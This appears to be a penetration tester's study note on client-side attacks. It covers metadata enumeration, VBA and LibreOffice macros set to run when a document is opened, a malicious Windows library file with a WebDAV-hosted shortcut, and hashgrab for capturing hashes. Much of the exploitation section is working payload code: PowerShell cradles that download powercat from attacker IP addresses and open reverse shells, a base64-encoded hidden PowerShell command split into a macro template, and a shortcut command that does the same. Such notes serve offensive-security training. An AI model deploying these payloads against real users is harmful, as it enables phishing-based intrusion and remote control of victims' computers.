---
title: Client-Side Attacks
---
# Enumeration
## Files
- Check Metadata of available documents with `exiftool`
```zsh
exiftool -a -u brochure.pdf
```
- `-a` will let us extract duplicate tags
- `-u` will let us extract unknown tags

## Client Fingerprinting
- We can use [Canarytokens](https://canarytokens.org/nest/) (Type 'WebBug')to get an Alert if someone visits our link with some fingerprinting information
- We can also chose other options such as 'Microsoft Word Document' or 'Acrobat Reader PDF' to embed our Canarytoken in such files

# Exploitation
## VBA Macros
- We can add Macros to Microsoft Word or Microsoft Excel
- Make sure to use the 97-2003 File Format (i.e `.doc` and `.xls` instead of `.docx` or `.xslx`)
- Use `Sub AutoOpen()` and `Sub Document_Open()` to automatically trigger the macro upon opening the file
> [!Caution]
>  - VBA has a limit of 255 characters for literal strings - So some payloads will need to be split in multiple variables
>  - Encode the payload with `base64` to avoid issues with special characters
- Use a web cradle to download `PowerCat.ps1` and create a reverseshell with it
```zsh
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```
- Encode this and create a `base64` string and add it to the macro `powershell.exe -nop -w hidden -e {base64-String}`
- In order to split the `base64` string, we can use the following script
```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
- This would result in the following template macro
```vbscript
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "
    CreateObject("Wscript.Shell").Run Str
End Sub
```

## ODT Macros
- Similar to VBA Macros in `*.doc` or `*.xls` files we can add Macros to OpenOffice `*.odt` documents
- We can open up a new document in LibreOffice Write and add a Macro by navigating to Tools -> Marcos -> Organize Macros -> Basic...
- Select the newly created Document "Untitled 1" -> New and add the Marco code
```vbscript
Sub Main
	 Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.180:8080/powercat.ps1');powercat -c 192.168.45.180 -p 80 -e powershell")
End Sub
```
- Save the document
- After creating the Marco we assign it to an action with Tools -> Customize -> Tab "Events" -> Open Document -> Macro...
![[Pasted image 20250118223417.png]]
- We should see the Marco assigned to the event after
![[Pasted image 20250118223905.png]]
## Windows Library Files

- Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a `.Library-ms` file extension and can be executed by double-clicking them in Windows Explorer
- Library files consist of three major parts, `General library information`, `Library properties` , and `Library locations` 
- We can create a WebDAV server which will contain a malicious `.lnk` file. After we can add our WebDAV link to the `.Library-ms` file
```zsh
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
- A template `.Library-ms` file could look like this
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
- The malicious `.lnk` file is best created on Windows (RightClick -> New -> Shortcut). As location of the link we can directly input our command `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.211:8000/powercat.ps1'); powercat -c 192.168.45.211 -p 9001 -e powershell`

## Hashgrab
- We can use [hashgrab](https://github.com/xct/hashgrab) to create `.lnk`, `.scf`,`.url` and other payloads that will trigger an authentication back to our machine which we can use to grab hashes using responder
- We can put those payloads on shares or locations that users might access
```zsh
py hashgrab.py 192.168.45.162 alexa
```